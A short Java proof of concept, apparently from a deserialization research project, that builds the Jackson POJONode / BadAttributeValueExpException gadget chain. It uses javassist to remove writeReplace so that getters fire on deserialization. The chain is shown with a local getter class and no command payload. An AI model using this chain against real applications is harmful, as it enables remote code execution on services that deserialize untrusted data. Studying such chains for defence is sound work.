package toString;

import com.fasterxml.jackson.databind.node.POJONode;
import javassist.*;
import tools.ReflectTools;

import javax.management.BadAttributeValueExpException;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.util.Map;
import java.util.Vector;

import static tools.ReflectTools.getFieldValue;
import static tools.ReflectTools.setFieldValue;

public class Pojo {
    public static void main(String[] args) throws Exception {
        GetterClass getterClass = new GetterClass();
        // 删除 BaseJsonNode#writeReplace 方法用于顺利序列化，不然序列化就触发了
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();

        POJONode node = new POJONode(getterClass);

        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        setFieldValue(bad, "val", node);

        byte[] bytes = ReflectTools.ser2bytes(bad);

        ReflectTools.deser(bytes, null);

    }
}
